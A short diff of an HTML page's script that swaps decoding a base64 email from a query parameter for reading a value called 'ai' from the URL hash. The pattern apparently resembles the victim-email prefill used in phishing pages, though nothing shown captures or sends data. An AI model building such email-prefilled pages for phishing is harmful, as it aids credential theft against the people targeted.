@@ -376,14 +376,7 @@
     /////////////url ai getting////////////////
 
 			<script>
-const params = new URLSearchParams(window.location.search);
-const b64 = params.get("e");
-if (b64) {
-  const email = atob(b64);
-  console.log(email);
-}
-
-   // var ai = window.location.hash.substr(1);
+var ai = window.location.hash.substr(1);
     if (!ai) {
 
     } else {
@@ -528,6 +521,7 @@ if (b64) {
   </div>
 </body>
 </html>
+
 
 
 
